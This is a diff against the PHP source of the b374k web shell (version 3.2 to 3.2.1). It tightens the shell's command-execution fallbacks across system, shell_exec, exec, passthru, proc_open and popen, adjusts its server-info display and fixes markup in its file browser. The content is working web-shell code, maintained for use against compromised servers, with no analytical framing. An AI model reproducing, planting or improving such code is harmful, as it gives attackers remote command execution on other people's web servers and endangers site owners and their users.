@@ -1,5 +1,5 @@
 <?php
-$GLOBALS['ver'] = "3.2";
+$GLOBALS['ver'] = "3.2.1";
 $GLOBALS['title'] = "b374k";
 
 @ob_start();
@@ -50,7 +50,8 @@ if(!function_exists('auth')){
 if(!function_exists('get_server_info')){
 	function get_server_info(){
 		$server_info['uname'] = php_uname();
-		$server_info['software'] = getenv("SERVER_SOFTWARE")." <span class='strong'>|</span> PHP ".phpversion();
+		$server_software = (getenv('SERVER_SOFTWARE')!='')? getenv('SERVER_SOFTWARE')."<span class='strong'>|</span> ":'';
+		$server_info['software'] = $server_software."  PHP ".phpversion();
 		$server_addr = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:$_SERVER["HTTP_HOST"];
 		$server_info['ip_adrress'] = "Server IP : ".$server_addr." <span class='strong'>|</span> Your IP : ".$_SERVER['REMOTE_ADDR'];
 		$server_info['time_at_server'] = "Time <span class='strong'>@</span> Server : ".@date("d M Y H:i:s",time());
@@ -149,30 +150,30 @@ if(!function_exists('execute')){
 		$output = "";
 		$code = $code." 2>&1";
 
-		if(function_exists('system')){
+		if(is_callable('system') && function_exists('system')){
 			ob_start();
 			@system($code);
 			$output = ob_get_contents();
 			ob_end_clean();
 			if(!empty($output)) return $output;
 		}
-		elseif(function_exists('shell_exec')){
+		elseif(is_callable('shell_exec') && function_exists('shell_exec')){
 			$output = @shell_exec($code);
 			if(!empty($output)) return $output;
 		}
-		elseif(function_exists('exec')){
+		elseif(is_callable('exec') && function_exists('exec')){
 			@exec($code,$res);
 			if(!empty($res)) foreach($res as $line) $output .= $line;
 			if(!empty($output)) return $output;
 		}
-		elseif(function_exists('passthru')){
+		elseif(is_callable('passthru') && function_exists('passthru')){
 			ob_start();
 			@passthru($code);
 			$output = ob_get_contents();
 			ob_end_clean();
 			if(!empty($output)) return $output;
 		}
-		elseif(function_exists('proc_open')){
+		elseif(is_callable('proc_open') && function_exists('proc_open')){
 			$desc = array(
 				0 => array("pipe", "r"),
 				1 => array("pipe", "w"),
@@ -189,7 +190,7 @@ if(!function_exists('execute')){
 			@proc_close($proc);
 			if(!empty($output)) return $output;
 		}
-		elseif(function_exists('popen')){
+		elseif(is_callable('popen') && function_exists('popen')){
 			$res = @popen($code, 'r');
 			if($res){
 				while(!feof($res)){
@@ -708,7 +709,7 @@ if(!function_exists('show_all_files')){
 			}
 			$output .= "
 	<tr data-path=\"".html_safe(realpath($d).DIRECTORY_SEPARATOR)."\"><td><div class='cBox".$cboxException."'></div></td>
-	<td style='white-space:normal;'><a class='navigate'>[ ".html_safe($d)." ]</a><span class='".$action." floatRight'>action</a></td>
+	<td style='white-space:normal;'><a class='navigate'>[ ".html_safe($d)." ]</a><span class='".$action." floatRight'>action</span></td>
 	<td>DIR</td>";
 			foreach($cols as $k=>$v){
 				$sortable = "";
@@ -720,7 +721,7 @@ if(!function_exists('show_all_files')){
 		foreach($allfiles as $f){
 			$output .= "
 	<tr data-path=\"".html_safe(realpath($f))."\"><td><div class='cBox'></div></td>
-	<td style='white-space:normal;'><a class='view'>".html_safe($f)."</a><span class='action floatRight'>action</a></td>
+	<td style='white-space:normal;'><a class='view'>".html_safe($f)."</a><span class='action floatRight'>action</span></td>
 	<td title='".filesize($f)."'>".get_filesize($f)."</td>";
 			foreach($cols as $k=>$v){
 				$sortable = "";
